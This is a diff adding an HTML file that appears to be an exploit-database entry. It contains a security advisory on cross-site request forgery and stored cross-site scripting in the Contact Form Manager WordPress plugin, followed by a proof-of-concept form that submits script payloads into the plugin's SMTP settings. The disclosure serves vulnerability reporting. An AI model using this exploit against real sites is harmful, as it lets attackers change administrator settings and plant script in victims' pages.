@@ -1,0 +1,53 @@
+<!--
+Source: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery___cross_site_scripting_in_contact_form_manager_wordpress_plugin.html
+
+Abstract
+It was discovered that Contact Form Manager does not protect against Cross-Site Request Forgery. This allows an attacker to change arbitrary Contact Form Manager settings. In addtion, the plugin also fails to apply proper output encoding, rendering it vulnerable to stored Cross-Site Scripting.
+
+Contact
+For feedback or questions about this advisory mail us at sumofpwn at securify.nl
+
+The Summer of Pwnage
+This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.
+
+OVE ID
+OVE-20160718-0003
+
+Tested versions
+These issues were successfully tested on Contact Form Manager WordPress Plugin version
+
+Fix
+There is currently no fix available.
+
+Introduction
+The Contact Form Manager WordPress Plugin lets users create and manage multiple customized contact forms for their website. It supports a wide range of contact form elements such as text field, email field, textarea, dropdown list, radio button, checkbox, date picker, captcha, and file uploader. It was discovered that Contact Form Manager does not protect against Cross-Site Request Forgery. This allows an attacker to change arbitrary Contact Form Manager settings. In addtion, the plugin also fails to apply proper output encoding, rendering it vulnerable to stored Cross-Site Scripting.
+
+Details
+These issues exists, because the plugin lacks an anti-CSRF token. Also improper filtering/output encoding is done on $_POST parameters. These issues are present in the filed contact-form-manager/admin/add_smtp.php and contact-form-manager/admin/form-edit.php.
+
+The username input field on the XYZ Contact > SMTP Settings is vulnerable for Cross-Site Scripting, as wel as the Contact Form Name input field on the XYZ Contact > Contact Form page.
+
+SMTP Settings URL:
+http://<target>/wp-admin/admin.php?page=contact-form-manager-manage-smtp
+
+Contact Forms URL:
+http://<target>/wp-admin/admin.php?page=contact-form-manager-managecontactformsp
+
+Proof of concept:
+-->
+
+<html>
+   <body>
+      <form id="f1" method="POST" action="http://<target>/wp-admin/admin.php?page=contact-form-manager-manage-smtp&action=add-smtp">
+         <table>
+            <tr><td>xyz_cfm_SmtpAuthentication<td><input name="xyz_cfm_SmtpAuthentication" value="true" size="100"></tr>
+            <tr><td>xyz_cfm_SmtpEmailAddress<td><input name="xyz_cfm_SmtpEmailAddress" value="<svg onload=alert(document.domain)>" size="100"></tr>
+            <tr><td>xyz_cfm_SmtpHostName<td><input name="xyz_cfm_SmtpHostName" value="<svg onload=alert(document.domain)>" size="100"></tr>
+            <tr><td>xyz_cfm_SmtpPassword<td><input name="xyz_cfm_SmtpPassword" value="<svg onload=alert(document.domain)>" size="100"></tr>
+            <tr><td>xyz_cfm_SmtpPortNumber<td><input name="xyz_cfm_SmtpPortNumber" value="25" size="100"></tr>
+            <tr><td>xyz_cfm_SmtpSecuirity<td><input name="xyz_cfm_SmtpSecuirity" value="notls" size="100"></tr>
+         </table>
+      </form>
+      <button onclick="document.getElementById('f1').submit()">Submit</button>
+   </body>
+</html>
